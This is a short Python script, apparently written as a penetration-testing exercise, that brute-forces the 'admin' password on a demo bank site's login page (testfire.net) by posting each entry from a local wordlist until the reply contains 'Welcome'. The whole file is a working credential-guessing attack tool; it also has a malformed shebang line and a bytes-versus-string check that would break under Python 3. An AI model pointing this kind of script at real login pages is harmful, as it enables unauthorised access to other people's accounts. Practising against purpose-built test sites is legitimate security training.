#/usr/bin/python

import requests

target_url = "http://testfire.net/login.jsp"

#data_dict = {"username": "admin", "password": "", "Login": "submit"}          #name of fields. and type of submit
data_dict = {"uid": "admin", "passw": "", "btnSubmit": "submit"}

try:

    with open("/home/kali/Downloads/password.txt", "r") as wordlist_file:
        for line in wordlist_file:
            word = line.strip()
            data_dict["passw"] = word
            response = requests.post(target_url, data=data_dict)
            #print("" + str(response.content))
            #print("" + str(data_dict))
            print(" trying ... " + word)
            #if "You must enter a valid username" not in response.content:
            if "Welcome" in response.content:
            #if "Welcome" in response.text:
                print("[+] Got the Password --> " + word)
                exit()

    print("[+] Reached end of file.")

except KeyboardInterrupt:
    print("\n[-] Exiting from program...")





